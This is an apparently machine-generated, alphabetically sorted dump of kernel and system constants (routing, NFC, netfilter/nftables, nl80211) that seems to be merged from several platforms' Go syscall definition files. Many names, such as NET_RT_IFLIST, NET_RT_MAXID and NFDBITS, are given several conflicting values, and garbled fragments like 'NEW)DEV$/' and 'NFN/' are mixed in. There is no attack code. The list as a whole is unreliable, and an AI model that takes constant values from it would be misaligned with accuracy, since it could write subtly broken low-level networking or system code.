NET_RT_DUMP                       = 0x1
NET_RT_DUMP                    = 0x1
NET_RT_DUMP2                            = 0x7
NET_RT_FLAGS                            = 0x2
NET_RT_FLAGS                      = 0x2
NET_RT_FLAGS                   = 0x2
NET_RT_FLAGS_PRIV                       = 0xa
NET_RT_IFLIST                           = 0x3
NET_RT_IFLIST                     = 0x3
NET_RT_IFLIST                     = 0x5
NET_RT_IFLIST                  = 0x3
NET_RT_IFLIST2                          = 0x6
NET_RT_IFLISTL                 = 0x5
NET_RT_IFMALIST                = 0x4
NET_RT_IFNAMES                    = 0x6
NET_RT_MAXID                            = 0xb
NET_RT_MAXID                      = 0x4
NET_RT_MAXID                      = 0x6
NET_RT_MAXID                      = 0x7
NET_RT_MAXID    = 0x6
NET_RT_OIFLIST                    = 0x4
NET_RT_OOIFLIST                   = 0x3
NET_RT_STAT                             = 0x4
NET_RT_STATS                      = 0x4
NET_RT_TABLE                      = 0x5
NET_RT_TRASH                            = 0x5
NEW)DEV$/ 
NEWDEV                        = 0x1
NFCProtocol    uint32
NFCProtocol uint32
NFC_(GENL
NFC_.
NFC_ATR_REQ_GB_MAXSIZE                      = 0x30
NFC_ATR_REQ_MAXSIZE                         = 0x40
NFC_ATR_RES_GB_MAXSIZE                      = 0x2f
NFC_ATR_RES_MAXSIZE                         = 0x40
NFC_ATTR_COMM_MODE                = 0xa
NFC_ATTR_DEVICE_INDEX             = 0x1
NFC_ATTR_DEVICE_NAME              = 0x2
NFC_ATTR_DEVICE_POWERED           = 0xc
NFC_ATTR_FIRMWARE_DOWNLOAD_STATUS = 0x18
NFC_ATTR_FIRMWARE_NAME            = 0x14
NFC_ATTR_IM_PROTOCOLS             = 0xd
NFC_ATTR_LLC_PARAM_LTO            = 0xf
NFC_ATTR_LLC_PARAM_MIUX           = 0x11
NFC_ATTR_LLC_PARAM_RW             = 0x10
NFC_ATTR_LLC_SDP                  = 0x13
NFC_ATTR_PROTOCOLS                = 0x3
NFC_ATTR_RF_MODE                  = 0xb
NFC_ATTR_SE                       = 0x12
NFC_ATTR_SE_AID                   = 0x17
NFC_ATTR_SE_APDU                  = 0x19
NFC_ATTR_SE_INDEX                 = 0x15
NFC_ATTR_SE_PARAMS                = 0x1c
NFC_ATTR_SE_TYPE                  = 0x16
NFC_ATTR_TARGET_INDEX             = 0x4
NFC_ATTR_TARGET_ISO15693_DSFID    = 0x1a
NFC_ATTR_TARGET_ISO15693_UID      = 0x1b
NFC_ATTR_TARGET_NFCID1            = 0x7
NFC_ATTR_TARGET_SEL_RES           = 0x6
NFC_ATTR_TARGET_SENSB_RES         = 0x8
NFC_ATTR_TARGET_SENSF_RES         = 0x9
NFC_ATTR_TARGET_SENS_RES          = 0x5
NFC_ATTR_TM_PROTOCOLS             = 0xe
NFC_ATTR_UNSPEC                   = 0x0
NFC_ATTR_VENDOR_DATA              = 0x1f
NFC_ATTR_VENDOR_ID                = 0x1d
NFC_ATTR_VENDOR_SUBCMD            = 0x1e
NFC_CMD_ACTIVATE_TARGET           = 0x1c
NFC_CMD_DEACTIVATE_TARGET         = 0x1e
NFC_CMD_DEP_LINK_DOWN             = 0x5
NFC_CMD_DEP_LINK_UP               = 0x4
NFC_CMD_DEV_DOWN                  = 0x3
NFC_CMD_DEV_UP                    = 0x2
NFC_CMD_DISABLE_SE                = 0x12
NFC_CMD_ENABLE_SE                 = 0x11
NFC_CMD_FW_DOWNLOAD               = 0x15
NFC_CMD_GET_DEVICE                = 0x1
NFC_CMD_GET_SE                    = 0x1a
NFC_CMD_GET_TARGET                = 0x8
NFC_CMD_LLC_GET_PARAMS            = 0xf
NFC_CMD_LLC_SDREQ                 = 0x13
NFC_CMD_LLC_SET_PARAMS            = 0x10
NFC_CMD_SE_IO                     = 0x1b
NFC_CMD_START_POLL                = 0x6
NFC_CMD_STOP_POLL                 = 0x7
NFC_CMD_UNSPEC                    = 0x0
NFC_CMD_VENDOR                    = 0x1d
NFC_COMM_ACTIVE                             = 0x0
NFC_COMM_PASSIVE                            = 0x1
NFC_DEVICE_NAME_MAXSIZE                     = 0x8
NFC_DIRECTION_RX                            = 0x0
NFC_DIRECTION_TX                            = 0x1
NFC_EVENT_DEVICE_ADDED            = 0xa
NFC_EVENT_DEVICE_REMOVED          = 0xb
NFC_EVENT_LLC_SDRES               = 0x14
NFC_EVENT_SE_ADDED                = 0x16
NFC_EVENT_SE_CONNECTIVITY         = 0x18
NFC_EVENT_SE_REMOVED              = 0x17
NFC_EVENT_SE_TRANSACTION          = 0x19
NFC_EVENT_TARGETS_FOUND           = 0x9
NFC_EVENT_TARGET_LOST             = 0xc
NFC_EVENT_TM_ACTIVATED            = 0xd
NFC_EVENT_TM_DEACTIVATED          = 0xe
NFC_FIRMWARE_NAME_MAXSIZE                   = 0x20
NFC_GB_MAXSIZE                              = 0x30
NFC_GENL_VERSION                            = 0x1
NFC_HEADER_SIZE                             = 0x1
NFC_ISO15693_UID_MAXSIZE                    = 0x8
NFC_LLCP_MAX_SERVICE_NAME                   = 0x3f
NFC_LLCP_MIUX                               = 0x1
NFC_LLCP_REMOTE_LTO                         = 0x3
NFC_LLCP_REMOTE_MIU                         = 0x2
NFC_LLCP_REMOTE_RW                          = 0x4
NFC_LLCP_RW                                 = 0x0
NFC_NFCID1_MAXSIZE                          = 0xa
NFC_NFCID2_MAXSIZE                          = 0x8
NFC_NFCID3_MAXSIZE                          = 0xa
NFC_PROTO_FELICA                            = 0x3
NFC_PROTO_FELICA_MASK                       = 0x8
NFC_PROTO_ISO14443                          = 0x4
NFC_PROTO_ISO14443_B                        = 0x6
NFC_PROTO_ISO14443_B_MASK                   = 0x40
NFC_PROTO_ISO14443_MASK                     = 0x10
NFC_PROTO_ISO15693                          = 0x7
NFC_PROTO_ISO15693_MASK                     = 0x80
NFC_PROTO_JEWEL                             = 0x1
NFC_PROTO_JEWEL_MASK                        = 0x2
NFC_PROTO_MAX                               = 0x8
NFC_PROTO_MIFARE                            = 0x2
NFC_PROTO_MIFARE_MASK                       = 0x4
NFC_PROTO_NFC_DEP                           = 0x5
NFC_PROTO_NFC_DEP_MASK                      = 0x20
NFC_RAW_HEADER_SIZE                         = 0x2
NFC_RF_INITIATOR                            = 0x0
NFC_RF_NONE                                 = 0x2
NFC_RF_TARGET                               = 0x1
NFC_SDP_ATTR_SAP                  = 0x2
NFC_SDP_ATTR_UNSPEC               = 0x0
NFC_SDP_ATTR_URI                  = 0x1
NFC_SENSB_RES_MAXSIZE                       = 0xc
NFC_SENSF_RES_MAXSIZE                       = 0x12
NFC_SE_DISABLED                             = 0x0
NFC_SE_EMBEDDED                             = 0x2
NFC_SE_ENABLED                              = 0x1
NFC_SE_UICC                                 = 0x1
NFC_SOCKPROTO_LLCP                          = 0x1
NFC_SOCKPROTO_MAX                           = 0x2
NFC_SOCKPROTO_RAW                           = 0x0
NFDBITS                                 = 0x20
NFDBITS                           = 0x20
NFDBITS                           = 0x40
NFDBITS                          = 0x20
NFDBITS                          = 0x40
NFDBITS                         = 0x20
NFDBITS                        = 0x20
NFDBITS                        = 0x40
NFDBITS                       = 0x20
NFDBITS                       = 0x40
NFN/ 
NFNETLINK_V0                                = 0x0
NFNLGRP_ACCT_QUOTA                          = 0x8
NFNLGRP_CONNTRACK_DESTROY                   = 0x3
NFNLGRP_CONNTRACK_EXP_DESTROY               = 0x6
NFNLGRP_CONNTRACK_EXP_NEW                   = 0x4
NFNLGRP_CONNTRACK_EXP_UPDATE                = 0x5
NFNLGRP_CONNTRACK_NEW                       = 0x1
NFNLGRP_CONNTRACK_UPDATE                    = 0x2
NFNLGRP_MAX                                 = 0x9
NFNLGRP_NFTABLES                            = 0x7
NFNLGRP_NFTRACE                             = 0x9
NFNLGRP_NONE                                = 0x0
NFNL_BATCH_GENID  = 0x1
NFNL_BATCH_MAX                              = 0x1
NFNL_BATCH_UNSPEC = 0x0
NFNL_MSG_BATCH_BEGIN                        = 0x10
NFNL_MSG_BATCH_END                          = 0x11
NFNL_NFA_NEST                               = 0x8000
NFNL_SUBSYS_ACCT                            = 0x7
NFNL_SUBSYS_COUNT                           = 0xd
NFNL_SUBSYS_CTHELPER                        = 0x9
NFNL_SUBSYS_CTNETLINK                       = 0x1
NFNL_SUBSYS_CTNETLINK_EXP                   = 0x2
NFNL_SUBSYS_CTNETLINK_TIMEOUT               = 0x8
NFNL_SUBSYS_HOOK                            = 0xc
NFNL_SUBSYS_IPSET                           = 0x6
NFNL_SUBSYS_NFTABLES                        = 0xa
NFNL_SUBSYS_NFT_COMPAT                      = 0xb
NFNL_SUBSYS_NONE                            = 0x0
NFNL_SUBSYS_OSF                             = 0x5
NFNL_SUBSYS_QUEUE                           = 0x3
NFNL_SUBSYS_ULOG                            = 0x4
NFPROTO_ARP      = 0x3
NFPROTO_BRIDGE   = 0x7
NFPROTO_DECNET   = 0xc
NFPROTO_INET     = 0x1
NFPROTO_IPV4     = 0x2
NFPROTO_IPV6     = 0xa
NFPROTO_NETDEV   = 0x5
NFPROTO_NUMPROTO = 0xd
NFPROTO_UNSPEC   = 0x0
NFS_SUPER_MAGIC                             = 0x6969
NFTA_BITWISE_DREG                 = 0x2
NFTA_BITWISE_LEN                  = 0x3
NFTA_BITWISE_MASK                 = 0x4
NFTA_BITWISE_SREG                 = 0x1
NFTA_BITWISE_UNSPEC               = 0x0
NFTA_BITWISE_XOR                  = 0x5
NFTA_BYTEORDER_DREG               = 0x2
NFTA_BYTEORDER_LEN                = 0x4
NFTA_BYTEORDER_OP                 = 0x3
NFTA_BYTEORDER_SIZE               = 0x5
NFTA_BYTEORDER_SREG               = 0x1
NFTA_BYTEORDER_UNSPEC             = 0x0
NFTA_CHAIN_COUNTERS               = 0x8
NFTA_CHAIN_HANDLE                 = 0x2
NFTA_CHAIN_HOOK                   = 0x4
NFTA_CHAIN_NAME                   = 0x3
NFTA_CHAIN_PAD                    = 0x9
NFTA_CHAIN_POLICY                 = 0x5
NFTA_CHAIN_TABLE                  = 0x1
NFTA_CHAIN_TYPE                   = 0x7
NFTA_CHAIN_UNSPEC                 = 0x0
NFTA_CHAIN_USE                    = 0x6
NFTA_CMP_DATA                     = 0x3
NFTA_CMP_OP                       = 0x2
NFTA_CMP_SREG                     = 0x1
NFTA_CMP_UNSPEC                   = 0x0
NFTA_COMPAT_NAME   = 0x1
NFTA_COMPAT_REV    = 0x2
NFTA_COMPAT_TYPE   = 0x3
NFTA_COMPAT_UNSPEC = 0x0
NFTA_COUNTER_BYTES                = 0x1
NFTA_COUNTER_PACKETS              = 0x2
NFTA_COUNTER_PAD                  = 0x3
NFTA_COUNTER_UNSPEC               = 0x0
NFTA_CT_DIRECTION                 = 0x3
NFTA_CT_DREG                      = 0x1
NFTA_CT_HELPER_L3PROTO            = 0x2
NFTA_CT_HELPER_L4PROTO            = 0x3
NFTA_CT_HELPER_NAME               = 0x1
NFTA_CT_HELPER_UNSPEC             = 0x0
NFTA_CT_KEY                       = 0x2
NFTA_CT_SREG                      = 0x4
NFTA_CT_UNSPEC                    = 0x0
NFTA_DATA_UNSPEC                  = 0x0
NFTA_DATA_VALUE                   = 0x1
NFTA_DATA_VERDICT                 = 0x2
NFTA_DUP_SREG_ADDR                = 0x1
NFTA_DUP_SREG_DEV                 = 0x2
NFTA_DUP_UNSPEC                   = 0x0
NFTA_DYNSET_EXPR                  = 0x7
NFTA_DYNSET_FLAGS                 = 0x9
NFTA_DYNSET_OP                    = 0x3
NFTA_DYNSET_PAD                   = 0x8
NFTA_DYNSET_SET_ID                = 0x2
NFTA_DYNSET_SET_NAME              = 0x1
NFTA_DYNSET_SREG_DATA             = 0x5
NFTA_DYNSET_SREG_KEY              = 0x4
NFTA_DYNSET_TIMEOUT               = 0x6
NFTA_DYNSET_UNSPEC                = 0x0
NFTA_EXPR_DATA                    = 0x2
NFTA_EXPR_NAME                    = 0x1
NFTA_EXPR_UNSPEC                  = 0x0
NFTA_EXTHDR_DREG                  = 0x1
NFTA_EXTHDR_FLAGS                 = 0x5
NFTA_EXTHDR_LEN                   = 0x4
NFTA_EXTHDR_OFFSET                = 0x3
NFTA_EXTHDR_OP                    = 0x6
NFTA_EXTHDR_SREG                  = 0x7
NFTA_EXTHDR_TYPE                  = 0x2
NFTA_EXTHDR_UNSPEC                = 0x0
NFTA_FIB_DREG                     = 0x1
NFTA_FIB_FLAGS                    = 0x3
NFTA_FIB_F_DADDR                  = 0x2
NFTA_FIB_F_IIF                    = 0x8
NFTA_FIB_F_MARK                   = 0x4
NFTA_FIB_F_OIF                    = 0x10
NFTA_FIB_F_PRESENT                = 0x20
NFTA_FIB_F_SADDR                  = 0x1
NFTA_FIB_RESULT                   = 0x2
NFTA_FIB_UNSPEC                   = 0x0
NFTA_FWD_SREG_DEV                 = 0x1
NFTA_FWD_UNSPEC                   = 0x0
NFTA_GEN_ID                       = 0x1
NFTA_GEN_PROC_NAME                = 0x3
NFTA_GEN_PROC_PID                 = 0x2
NFTA_GEN_UNSPEC                   = 0x0
NFTA_HASH_DREG                    = 0x2
NFTA_HASH_LEN                     = 0x3
NFTA_HASH_MODULUS                 = 0x4
NFTA_HASH_OFFSET                  = 0x6
NFTA_HASH_SEED                    = 0x5
NFTA_HASH_SREG                    = 0x1
NFTA_HASH_TYPE                    = 0x7
NFTA_HASH_UNSPEC                  = 0x0
NFTA_HOOK_DEV                     = 0x3
NFTA_HOOK_HOOKNUM                 = 0x1
NFTA_HOOK_PRIORITY                = 0x2
NFTA_HOOK_UNSPEC                  = 0x0
NFTA_IMMEDIATE_DATA               = 0x2
NFTA_IMMEDIATE_DREG               = 0x1
NFTA_IMMEDIATE_UNSPEC             = 0x0
NFTA_LIMIT_BURST                  = 0x3
NFTA_LIMIT_FLAGS                  = 0x5
NFTA_LIMIT_PAD                    = 0x6
NFTA_LIMIT_RATE                   = 0x1
NFTA_LIMIT_TYPE                   = 0x4
NFTA_LIMIT_UNIT                   = 0x2
NFTA_LIMIT_UNSPEC                 = 0x0
NFTA_LIST_ELEM                    = 0x1
NFTA_LIST_UNSPEC                  = 0x0
NFTA_LOG_FLAGS                    = 0x6
NFTA_LOG_GROUP                    = 0x1
NFTA_LOG_LEVEL                    = 0x5
NFTA_LOG_PREFIX                   = 0x2
NFTA_LOG_QTHRESHOLD               = 0x4
NFTA_LOG_SNAPLEN                  = 0x3
NFTA_LOG_UNSPEC                   = 0x0
NFTA_LOOKUP_DREG                  = 0x3
NFTA_LOOKUP_FLAGS                 = 0x5
NFTA_LOOKUP_SET                   = 0x1
NFTA_LOOKUP_SET_ID                = 0x4
NFTA_LOOKUP_SREG                  = 0x2
NFTA_LOOKUP_UNSPEC                = 0x0
NFTA_MASQ_FLAGS                   = 0x1
NFTA_MASQ_REG_PROTO_MAX           = 0x3
NFTA_MASQ_REG_PROTO_MIN           = 0x2
NFTA_MASQ_UNSPEC                  = 0x0
NFTA_MATCH_INFO    = 0x3
NFTA_MATCH_NAME    = 0x1
NFTA_MATCH_REV     = 0x2
NFTA_MATCH_UNSPEC  = 0x0
NFTA_META_DREG                    = 0x1
NFTA_META_KEY                     = 0x2
NFTA_META_SREG                    = 0x3
NFTA_META_UNSPEC                  = 0x0
NFTA_NAT_FAMILY                   = 0x2
NFTA_NAT_FLAGS                    = 0x7
NFTA_NAT_REG_ADDR_MAX             = 0x4
NFTA_NAT_REG_ADDR_MIN             = 0x3
NFTA_NAT_REG_PROTO_MAX            = 0x6
NFTA_NAT_REG_PROTO_MIN            = 0x5
NFTA_NAT_TYPE                     = 0x1
NFTA_NAT_UNSPEC                   = 0x0
NFTA_NG_DREG                      = 0x1
NFTA_NG_MODULUS                   = 0x2
NFTA_NG_OFFSET                    = 0x4
NFTA_NG_TYPE                      = 0x3
NFTA_NG_UNSPEC                    = 0x0
NFTA_OBJREF_IMM_NAME              = 0x2
NFTA_OBJREF_IMM_TYPE              = 0x1
NFTA_OBJREF_SET_ID                = 0x5
NFTA_OBJREF_SET_NAME              = 0x4
NFTA_OBJREF_SET_SREG              = 0x3
NFTA_OBJREF_UNSPEC                = 0x0
NFTA_OBJ_DATA                     = 0x4
NFTA_OBJ_NAME                     = 0x2
NFTA_OBJ_TABLE                    = 0x1
NFTA_OBJ_TYPE                     = 0x3
NFTA_OBJ_UNSPEC                   = 0x0
NFTA_OBJ_USE                      = 0x5
NFTA_PAYLOAD_BASE                 = 0x2
NFTA_PAYLOAD_CSUM_FLAGS           = 0x8
NFTA_PAYLOAD_CSUM_OFFSET          = 0x7
NFTA_PAYLOAD_CSUM_TYPE            = 0x6
NFTA_PAYLOAD_DREG                 = 0x1
NFTA_PAYLOAD_LEN                  = 0x4
NFTA_PAYLOAD_OFFSET               = 0x3
NFTA_PAYLOAD_SREG                 = 0x5
NFTA_PAYLOAD_UNSPEC               = 0x0
NFTA_QUEUE_FLAGS                  = 0x3
NFTA_QUEUE_NUM                    = 0x1
NFTA_QUEUE_SREG_QNUM              = 0x4
NFTA_QUEUE_TOTAL                  = 0x2
NFTA_QUEUE_UNSPEC                 = 0x0
NFTA_QUOTA_BYTES                  = 0x1
NFTA_QUOTA_CONSUMED               = 0x4
NFTA_QUOTA_FLAGS                  = 0x2
NFTA_QUOTA_PAD                    = 0x3
NFTA_QUOTA_UNSPEC                 = 0x0
NFTA_RANGE_FROM_DATA              = 0x3
NFTA_RANGE_OP                     = 0x2
NFTA_RANGE_SREG                   = 0x1
NFTA_RANGE_TO_DATA                = 0x4
NFTA_RANGE_UNSPEC                 = 0x0
NFTA_REDIR_FLAGS                  = 0x3
NFTA_REDIR_REG_PROTO_MAX          = 0x2
NFTA_REDIR_REG_PROTO_MIN          = 0x1
NFTA_REDIR_UNSPEC                 = 0x0
NFTA_REJECT_ICMP_CODE             = 0x2
NFTA_REJECT_TYPE                  = 0x1
NFTA_REJECT_UNSPEC                = 0x0
NFTA_RT_DREG                      = 0x1
NFTA_RT_KEY                       = 0x2
NFTA_RT_UNSPEC                    = 0x0
NFTA_RULE_CHAIN                   = 0x2
NFTA_RULE_COMPAT                  = 0x5
NFTA_RULE_COMPAT_FLAGS            = 0x2
NFTA_RULE_COMPAT_PROTO            = 0x1
NFTA_RULE_COMPAT_UNSPEC           = 0x0
NFTA_RULE_EXPRESSIONS             = 0x4
NFTA_RULE_HANDLE                  = 0x3
NFTA_RULE_ID                      = 0x9
NFTA_RULE_PAD                     = 0x8
NFTA_RULE_POSITION                = 0x6
NFTA_RULE_TABLE                   = 0x1
NFTA_RULE_UNSPEC                  = 0x0
NFTA_RULE_USERDATA                = 0x7
NFTA_SET_DATA_LEN                 = 0x7
NFTA_SET_DATA_TYPE                = 0x6
NFTA_SET_DESC                     = 0x9
NFTA_SET_DESC_SIZE                = 0x1
NFTA_SET_DESC_UNSPEC              = 0x0
NFTA_SET_ELEM_DATA                = 0x2
NFTA_SET_ELEM_EXPIRATION          = 0x5
NFTA_SET_ELEM_EXPR                = 0x7
NFTA_SET_ELEM_FLAGS               = 0x3
NFTA_SET_ELEM_KEY                 = 0x1
NFTA_SET_ELEM_LIST_ELEMENTS       = 0x3
NFTA_SET_ELEM_LIST_SET            = 0x2
NFTA_SET_ELEM_LIST_SET_ID         = 0x4
NFTA_SET_ELEM_LIST_TABLE          = 0x1
NFTA_SET_ELEM_LIST_UNSPEC         = 0x0
NFTA_SET_ELEM_OBJREF              = 0x9
NFTA_SET_ELEM_PAD                 = 0x8
NFTA_SET_ELEM_TIMEOUT             = 0x4
NFTA_SET_ELEM_UNSPEC              = 0x0
NFTA_SET_ELEM_USERDATA            = 0x6
NFTA_SET_FLAGS                    = 0x3
NFTA_SET_GC_INTERVAL              = 0xc
NFTA_SET_ID                       = 0xa
NFTA_SET_KEY_LEN                  = 0x5
NFTA_SET_KEY_TYPE                 = 0x4
NFTA_SET_NAME                     = 0x2
NFTA_SET_OBJ_TYPE                 = 0xf
NFTA_SET_PAD                      = 0xe
NFTA_SET_POLICY                   = 0x8
NFTA_SET_TABLE                    = 0x1
NFTA_SET_TIMEOUT                  = 0xb
NFTA_SET_UNSPEC                   = 0x0
NFTA_SET_USERDATA                 = 0xd
NFTA_TABLE_FLAGS                  = 0x2
NFTA_TABLE_NAME                   = 0x1
NFTA_TABLE_UNSPEC                 = 0x0
NFTA_TABLE_USE                    = 0x3
NFTA_TARGET_INFO   = 0x3
NFTA_TARGET_NAME   = 0x1
NFTA_TARGET_REV    = 0x2
NFTA_TARGET_UNSPEC = 0x0
NFTA_TRACE_CHAIN                  = 0x2
NFTA_TRACE_ID                     = 0x6
NFTA_TRACE_IIF                    = 0xa
NFTA_TRACE_IIFTYPE                = 0xb
NFTA_TRACE_LL_HEADER              = 0x7
NFTA_TRACE_MARK                   = 0xe
NFTA_TRACE_NETWORK_HEADER         = 0x8
NFTA_TRACE_NFPROTO                = 0xf
NFTA_TRACE_OIF                    = 0xc
NFTA_TRACE_OIFTYPE                = 0xd
NFTA_TRACE_PAD                    = 0x11
NFTA_TRACE_POLICY                 = 0x10
NFTA_TRACE_RULE_HANDLE            = 0x3
NFTA_TRACE_TABLE                  = 0x1
NFTA_TRACE_TRANSPORT_HEADER       = 0x9
NFTA_TRACE_TYPE                   = 0x4
NFTA_TRACE_UNSPEC                 = 0x0
NFTA_TRACE_VERDICT                = 0x5
NFTA_VERDICT_CHAIN                = 0x2
NFTA_VERDICT_CODE                 = 0x1
NFTA_VERDICT_UNSPEC               = 0x0
NFT_BREAK                         = -0x2
NFT_BYTEORDER_HTON                = 0x1
NFT_BYTEORDER_NTOH                = 0x0
NFT_CMP_EQ                        = 0x0
NFT_CMP_GT                        = 0x4
NFT_CMP_GTE                       = 0x5
NFT_CMP_LT                        = 0x2
NFT_CMP_LTE                       = 0x3
NFT_CMP_NEQ                       = 0x1
NFT_CONTINUE                      = -0x1
NFT_CT_AVGPKT                     = 0x10
NFT_CT_BYTES                      = 0xf
NFT_CT_DIRECTION                  = 0x1
NFT_CT_DST                        = 0x9
NFT_CT_EVENTMASK                  = 0x12
NFT_CT_EXPIRATION                 = 0x5
NFT_CT_HELPER                     = 0x6
NFT_CT_L3PROTOCOL                 = 0x7
NFT_CT_LABELS                     = 0xd
NFT_CT_MARK                       = 0x3
NFT_CT_PKTS                       = 0xe
NFT_CT_PROTOCOL                   = 0xa
NFT_CT_PROTO_DST                  = 0xc
NFT_CT_PROTO_SRC                  = 0xb
NFT_CT_SECMARK                    = 0x4
NFT_CT_SRC                        = 0x8
NFT_CT_STATE                      = 0x0
NFT_CT_STATUS                     = 0x2
NFT_CT_ZONE                       = 0x11
NFT_DATA_VALUE                    = 0x0
NFT_DATA_VERDICT                  = 0xffffff00
NFT_DYNSET_F_INV                  = 0x1
NFT_DYNSET_OP_ADD                 = 0x0
NFT_DYNSET_OP_UPDATE              = 0x1
NFT_EXTHDR_F_PRESENT              = 0x1
NFT_EXTHDR_OP_IPV6                = 0x0
NFT_EXTHDR_OP_TCPOPT              = 0x1
NFT_FIB_RESULT_ADDRTYPE           = 0x3
NFT_FIB_RESULT_OIF                = 0x1
NFT_FIB_RESULT_OIFNAME            = 0x2
NFT_FIB_RESULT_UNSPEC             = 0x0
NFT_GOTO                          = -0x4
NFT_HASH_JENKINS                  = 0x0
NFT_HASH_SYM                      = 0x1
NFT_JUMP                          = -0x3
NFT_LIMIT_F_INV                   = 0x1
NFT_LIMIT_PKTS                    = 0x0
NFT_LIMIT_PKT_BYTES               = 0x1
NFT_LOOKUP_F_INV                  = 0x1
NFT_META_BRI_IIFNAME              = 0x11
NFT_META_BRI_OIFNAME              = 0x12
NFT_META_CGROUP                   = 0x17
NFT_META_CPU                      = 0x14
NFT_META_IIF                      = 0x4
NFT_META_IIFGROUP                 = 0x15
NFT_META_IIFNAME                  = 0x6
NFT_META_IIFTYPE                  = 0x8
NFT_META_L4PROTO                  = 0x10
NFT_META_LEN                      = 0x0
NFT_META_MARK                     = 0x3
NFT_META_NFPROTO                  = 0xf
NFT_META_NFTRACE                  = 0xc
NFT_META_OIF                      = 0x5
NFT_META_OIFGROUP                 = 0x16
NFT_META_OIFNAME                  = 0x7
NFT_META_OIFTYPE                  = 0x9
NFT_META_PKTTYPE                  = 0x13
NFT_META_PRANDOM                  = 0x18
NFT_META_PRIORITY                 = 0x2
NFT_META_PROTOCOL                 = 0x1
NFT_META_RTCLASSID                = 0xd
NFT_META_SECMARK                  = 0xe
NFT_META_SKGID                    = 0xb
NFT_META_SKUID                    = 0xa
NFT_MSG_DELCHAIN                  = 0x5
NFT_MSG_DELOBJ                    = 0x14
NFT_MSG_DELRULE                   = 0x8
NFT_MSG_DELSET                    = 0xb
NFT_MSG_DELSETELEM                = 0xe
NFT_MSG_DELTABLE                  = 0x2
NFT_MSG_GETCHAIN                  = 0x4
NFT_MSG_GETGEN                    = 0x10
NFT_MSG_GETOBJ                    = 0x13
NFT_MSG_GETOBJ_RESET              = 0x15
NFT_MSG_GETRULE                   = 0x7
NFT_MSG_GETSET                    = 0xa
NFT_MSG_GETSETELEM                = 0xd
NFT_MSG_GETTABLE                  = 0x1
NFT_MSG_MAX                       = 0x19
NFT_MSG_NEWCHAIN                  = 0x3
NFT_MSG_NEWGEN                    = 0xf
NFT_MSG_NEWOBJ                    = 0x12
NFT_MSG_NEWRULE                   = 0x6
NFT_MSG_NEWSET                    = 0x9
NFT_MSG_NEWSETELEM                = 0xc
NFT_MSG_NEWTABLE                  = 0x0
NFT_MSG_TRACE                     = 0x11
NFT_NAT_DNAT                      = 0x1
NFT_NAT_SNAT                      = 0x0
NFT_NG_INCREMENTAL                = 0x0
NFT_NG_RANDOM                     = 0x1
NFT_PAYLOAD_CSUM_INET             = 0x1
NFT_PAYLOAD_CSUM_NONE             = 0x0
NFT_PAYLOAD_L4CSUM_PSEUDOHDR      = 0x1
NFT_PAYLOAD_LL_HEADER             = 0x0
NFT_PAYLOAD_NETWORK_HEADER        = 0x1
NFT_PAYLOAD_TRANSPORT_HEADER      = 0x2
NFT_QUOTA_F_DEPLETED              = 0x2
NFT_QUOTA_F_INV                   = 0x1
NFT_RANGE_EQ                      = 0x0
NFT_RANGE_NEQ                     = 0x1
NFT_REG32_00                      = 0x8
NFT_REG32_01                      = 0x9
NFT_REG32_02                      = 0xa
NFT_REG32_03                      = 0xb
NFT_REG32_04                      = 0xc
NFT_REG32_05                      = 0xd
NFT_REG32_06                      = 0xe
NFT_REG32_07                      = 0xf
NFT_REG32_08                      = 0x10
NFT_REG32_09                      = 0x11
NFT_REG32_10                      = 0x12
NFT_REG32_11                      = 0x13
NFT_REG32_12                      = 0x14
NFT_REG32_13                      = 0x15
NFT_REG32_14                      = 0x16
NFT_REG32_15                      = 0x17
NFT_REG_1                         = 0x1
NFT_REG_2                         = 0x2
NFT_REG_3                         = 0x3
NFT_REG_4                         = 0x4
NFT_REG_VERDICT                   = 0x0
NFT_REJECT_ICMPX_ADMIN_PROHIBITED = 0x3
NFT_REJECT_ICMPX_HOST_UNREACH     = 0x2
NFT_REJECT_ICMPX_NO_ROUTE         = 0x0
NFT_REJECT_ICMPX_PORT_UNREACH     = 0x1
NFT_REJECT_ICMPX_UNREACH          = 0x2
NFT_REJECT_ICMP_UNREACH           = 0x0
NFT_REJECT_TCP_RST                = 0x1
NFT_RETURN                        = -0x5
NFT_RT_CLASSID                    = 0x0
NFT_RT_NEXTHOP4                   = 0x1
NFT_RT_NEXTHOP6                   = 0x2
NFT_RT_TCPMSS                     = 0x3
NFT_RULE_COMPAT_F_INV             = 0x2
NFT_RULE_COMPAT_F_MASK            = 0x2
NFT_SET_ANONYMOUS                 = 0x1
NFT_SET_CONSTANT                  = 0x2
NFT_SET_ELEM_INTERVAL_END         = 0x1
NFT_SET_EVAL                      = 0x20
NFT_SET_INTERVAL                  = 0x4
NFT_SET_MAP                       = 0x8
NFT_SET_OBJECT                    = 0x40
NFT_SET_POL_MEMORY                = 0x1
NFT_SET_POL_PERFORMANCE           = 0x0
NFT_SET_TIMEOUT                   = 0x10
NFT_TABLE_F_DORMANT               = 0x1
NFT_TRACETYPE_POLICY              = 0x1
NFT_TRACETYPE_RETURN              = 0x2
NFT_TRACETYPE_RULE                = 0x3
NFT_TRACETYPE_UNSPEC              = 0x0
NF_INET_FORWARD      = 0x2
NF_INET_LOCAL_IN     = 0x1
NF_INET_LOCAL_OUT    = 0x3
NF_INET_NUMHOOKS     = 0x5
NF_INET_POST_ROUTING = 0x4
NF_INET_PRE_ROUTING  = 0x0
NF_NETDEV_EGRESS   = 0x1
NF_NETDEV_INGRESS  = 0x0
NF_NETDEV_NUMHOOKS = 0x2
NHA_BLACKHOLE  = 0x4
NHA_ENCAP      = 0x8
NHA_ENCAP_TYPE = 0x7
NHA_GATEWAY    = 0x6
NHA_GROUP      = 0x2
NHA_GROUPS     = 0x9
NHA_GROUP_TYPE = 0x3
NHA_ID         = 0x1
NHA_MASTER     = 0xa
NHA_OIF        = 0x5
NHA_UNSPEC     = 0x0
NICE
NILFS_SUPER_MAGIC                           = 0x3434
NL0                                         = 0x0
NL0                                     = 0x0
NL0                           = 0x0
NL1                                         = 0x100
NL1                                     = 0x100
NL1                           = 0x100
NL1                           = 0x4000
NL2                                     = 0x200
NL2                              = 0x200
NL2                           = 0x8000
NL3                                     = 0x300
NL3                              = 0x300
NL3                           = 0xc000
NL80211_ACL_POLICY_ACCEPT_UNLESS_LISTED                 = 0x0
NL80211_ACL_POLICY_DENY_UNLESS_LISTED                   = 0x1
NL80211_AC_BE                                           = 0x2
NL80211_AC_BK                                           = 0x3
NL80211_AC_VI                                           = 0x1
NL80211_AC_VO                                           = 0x0
NL80211_ATTR_4ADDR                                      = 0x53
NL80211_ATTR_ACK                                        = 0x5c
NL80211_ATTR_ACK_SIGNAL                                 = 0x107
